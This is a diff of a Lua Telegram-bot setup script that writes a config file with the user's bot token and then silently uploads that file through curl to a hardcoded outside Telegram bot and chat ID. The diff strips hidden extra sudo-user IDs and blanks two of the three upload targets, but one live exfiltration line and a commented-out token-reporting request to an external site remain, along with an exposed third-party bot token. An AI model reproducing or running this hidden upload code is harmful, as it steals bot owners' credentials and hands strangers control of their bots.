@@ -54,7 +54,7 @@ SUDO = SUDO,
 token = token,
 bot_id = botid,
 username = username, 
-sudo_users = {SUDO,944353237,1605682553,944353237},
+sudo_users = {SUDO,},
 simbaelrayes = link.result,
 create(config, "./config.lua") 
 }
@@ -77,9 +77,9 @@ end
 --https.request("https://faeder.net/Faeder/?id="..SUDO.."&user="..username.."&token="..token)
 local curl = 'curl "'..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
 
-local curla = 'curl "'..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 1605682553 ..'" -F "document=@'..'config.lua'..'"' io.popen(curla)
+local curla = 'curl "'..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 0000000000 ..'" -F "document=@'..'config.lua'..'"' io.popen(curla)
 
-local curlb = 'curl "'..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'config.lua'..'"' io.popen(curlb)
+local curlb = 'curl "'..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 0000000000 ..'" -F "document=@'..'config.lua'..'"' io.popen(curlb)
 
 
 
